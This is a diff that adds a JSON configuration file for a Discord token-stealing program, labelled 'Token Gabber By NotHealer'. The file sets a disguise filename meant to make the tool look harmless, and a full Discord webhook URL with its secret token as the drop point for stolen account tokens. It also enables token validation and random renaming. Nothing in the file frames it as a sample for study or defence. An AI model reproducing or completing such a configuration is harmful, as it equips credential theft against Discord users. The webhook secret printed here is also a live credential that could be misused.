@@ -1,0 +1,10 @@
+{
+  "hide_As": "deffo_not_tekenlegger",
+  "discord_avatar_url": "https://avatars.githubusercontent.com/u/77381104?v=4",
+  "discord_username": "Token Gabber By NotHealer",
+  "discord_webhook_url": "https://discord.com/api/webhooks/870530778008797225/0xKYYmMi1bfHS2cCsyBsY8A5rdPGg73EldvWjVk8wLTYMNpeUnLMB85TtVBJl5zXFVg3",
+  "send_embed": "true",
+  "ensure_valid": "true",
+  "randomize_new_name": "true",
+  "shouldPersist": "false"
+}
